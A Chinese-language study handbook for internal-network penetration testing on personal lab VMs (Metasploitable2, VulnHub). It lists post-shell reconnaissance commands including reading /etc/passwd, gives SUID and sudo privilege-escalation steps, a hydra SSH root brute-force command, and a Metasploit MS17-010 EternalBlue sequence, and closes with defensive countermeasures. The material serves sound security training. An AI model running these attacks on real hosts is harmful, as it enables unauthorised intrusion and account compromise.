# 内网基础手册（打完 DVWA 之后）

> 只打自己的靶机（Metasploitable2、VulnHub 虚拟机）。对内网真实环境动手是刑事风险。

## 0. 一句话定位

外网渗透是"进门"，内网渗透是"进门之后能走多远"。面试中"你会内网吗"= 会提权、会横向、会查网络结构。

## 1. 前置条件

- Kali + 一台靶机在同一网段（VMware 都设"仅主机模式"或都桥接）
- 推荐靶机：**Metasploitable2**（入门专用，全是洞）或 VulnHub 的 Kioptrix
- 你已经有了一台机器的 shell 之后，才进入内网阶段

## 2. 内网渗透四步

信息收集 → 提权 → 横向移动 → 权限维持/清理痕迹

## 3. 信息收集（先看明白自己在哪）

Linux 上拿到 shell 后：
```
id                 # 我是谁，什么权限
uname -a           # 系统版本（提权要看）
ip a; route -n     # 我在哪个网段，通向哪
arp -a             # 邻居有哪些机器
cat /etc/passwd    # 有哪些用户
sudo -l            # 我能用 sudo 跑什么（提权金矿）
crontab -l         # 定时任务（可能藏后门/提权点）
find / -perm -4000 -type f 2>/dev/null   # 找 SUID 文件
```
Windows 上：
```
whoami; ipconfig /all; netstat -ano; tasklist; net user
```

## 4. 提权（三个必做实验）

实验一：**SUID 提权**（Linux）
`find / -perm -u=s -type f 2>/dev/null` 找到带 SUID 位的命令后，查它能不能被滥用（靶场里常是 find/vim 等）——SUID = 这个程序以文件主人的身份跑，跑出个 root 的 find 就是 root。

实验二：**sudo 滥用**
`sudo -l` 列出可免密执行的命令 → 查 GTFO（gtfobins.github.io）找对应命令的提权用法。

实验三：**内核漏洞提权**
`uname -a` 拿到版本 → `searchsploit 版本号` 找现成 exp（概念性了解即可，别依赖）。

## 5. 横向移动（常见服务与工具）

| 端口 | 服务 | 常见打法 |
|---|---|---|
| 445 | SMB | 弱口令、MS17-010（永恒之蓝） |
| 22 | SSH | hydra 弱口令爆破 |
| 3389 | RDP | 弱口令、爆破 |
| 3306 | MySQL | 弱口令 |
| 1433 | MSSQL | 弱口令、xp_cmdshell |

两个必做实验：

1. **SSH 爆破**（hydra）：
```
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://靶机IP
```
2. **MS17-010**（msfconsole，只在靶机上）：
```
search ms17_010
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 靶机IP
run
```

其他常用：`impacket`（psexec/wmiexec 概念）、`nmap -sV` 端口侦察、`searchsploit` 找漏洞。

## 6. 防御视角（面试时反过来问自己）

为什么横向能成功？→ 口令复用、不打补丁、无监控、无分段。
对应防御：补丁管理、强口令 + MFA、最小权限、日志审计、内网分段（VLAN/防火墙）。

## 7. 红线

- MS17-010、爆破、提权，全部只对**自己的靶机**
- 别对学校、别对任何人/公司的网段扫哪怕一个端口
- "练内网"的替代品：自己搭多台虚拟机组一个"小内网"

## 8. 完成标准

三个实验做完（SSH 爆破成功一次、SUID 提权成功一次、MS17-010 打进靶机一次），且能讲清楚"信息收集→提权→横向"每步在干嘛。
